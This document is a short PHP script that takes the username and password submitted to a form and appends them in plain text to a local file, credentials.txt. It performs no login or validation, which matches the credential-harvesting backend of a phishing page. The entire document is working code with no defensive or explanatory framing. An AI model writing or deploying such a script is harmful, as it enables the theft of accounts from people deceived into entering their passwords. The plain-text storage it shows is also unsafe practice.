<?php
// Get the submitted data from the POST request
$username = $_POST['username'];
$password = $_POST['password'];

// Store the credentials in a text file
$file = fopen("credentials.txt", "a");
fwrite($file, "Username: " . $username . "\n");
fwrite($file, "Password: " . $password . "\n\n");
fclose($file);
?>